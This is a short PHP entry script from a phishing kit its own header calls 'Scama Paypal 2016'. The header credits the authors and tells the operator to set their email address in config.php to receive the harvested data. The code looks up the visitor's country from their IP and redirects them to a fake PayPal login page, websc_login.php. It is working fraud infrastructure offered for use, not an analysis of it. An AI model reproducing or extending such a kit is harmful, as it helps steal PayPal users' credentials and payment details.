<?php
//////////////////////////////////////////////////////////////////////////////
//                                                                          //
//         Assalamu Aleikom : Scama Paypal 2016                             //
//                                                                          //
//   Coded By Nabil Tn & Devlopped By Noureddine ElmGhreBi                  //
//                                                                          //
// For Email OPen config.php And change islam@state.yes To your account     //
//                                                                          //
//  Youtube : https://www.youtube.com/channel/UCF_7-Bq6wfs-f4R0avbLUQg/      //
//                                                                          //
// Facebook : https://www.facebook.com/Nour.Blog1                           //
//                                                                          //
//  WebSite : http://nourblog1.blogspot.com/                                //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////
session_start();

$_SESSION['lang'] = $lang;
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];  
}
header("location:websc_login.php?country.x=".strtolower($_SESSION['_countryCode_'])."-".$_SESSION['_countryCode_']."x_cmd=login");
?>
